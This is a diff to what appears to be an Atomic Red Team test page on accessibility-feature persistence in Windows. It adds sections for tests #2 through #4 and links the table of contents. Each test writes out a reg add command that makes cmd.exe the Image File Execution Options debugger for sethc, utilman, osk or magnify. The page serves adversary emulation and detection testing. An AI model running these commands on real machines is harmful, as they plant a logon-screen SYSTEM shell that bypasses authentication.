@@ -23,9 +23,9 @@ Other accessibility features exist that may also be leveraged in a similar fashi
 
 ## Atomic Tests
 
-- Atomic Test #1 - Attaches Command Prompt As Debugger To Process - osk
+- [Atomic Test #1 - Attaches Command Prompt As Debugger To Process - osk](#atomic-test-1---attaches-command-prompt-as-debugger-to-process---osk)
 
-- Atomic Test #2 - Attaches Command Prompt As Debugger To Process - sethc
+- [Atomic Test #2 - Attaches Command Prompt As Debugger To Process - sethc](#atomic-test-2---attaches-command-prompt-as-debugger-to-process---sethc)
 
 - Atomic Test #3 - Attaches Command Prompt As Debugger To Process - utilman
 
@@ -36,6 +36,7 @@ Other accessibility features exist that may also be leveraged in a similar fashi
 - Atomic Test #6 - Attaches Command Prompt As Debugger To Process - DisplaySwitch
 
 - Atomic Test #7 - Attaches Command Prompt As Debugger To Process - AtBroker
+
 
 ## Atomic Test #1 - Attaches Command Prompt As Debugger To Process - osk
 This allows adversaries to execute the attached process
@@ -54,6 +55,7 @@ This allows adversaries to execute the attached process
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 ```
 
+
 ## Atomic Test #2 - Attaches Command Prompt As Debugger To Process - sethc
 This allows adversaries to execute the attached process
 
@@ -64,6 +66,42 @@ This allows adversaries to execute the attached process
 | Name | Description | Type | Default Value | 
 |:------:|:-------------:|:------:|:---------------:|
 | target_executable | File You Want To Attach cmd To | String | sethc.exe|
+
+#### Run it with `command_prompt`!
+
+```
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+```
+
+
+## Atomic Test #3 - Attaches Command Prompt As Debugger To Process - utilman
+This allows adversaries to execute the attached process
+
+**Supported Platforms:** Windows
+
+#### Inputs
+
+| Name | Description | Type | Default Value | 
+|:------:|:-------------:|:------:|:---------------:|
+| target_executable | File You Want To Attach cmd To | String | utilman.exe|
+
+#### Run it with `command_prompt`!
+
+```
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+```
+
+
+## Atomic Test #4 - Attaches Command Prompt As Debugger To Process - magnify
+This allows adversaries to execute the attached process
+
+**Supported Platforms:** Windows
+
+#### Inputs
+
+| Name | Description | Type | Default Value | 
+|:------:|:-------------:|:------:|:---------------:|
+| target_executable | File You Want To Attach cmd To | String | magnify.exe|
 
 #### Run it with `command_prompt`!
 
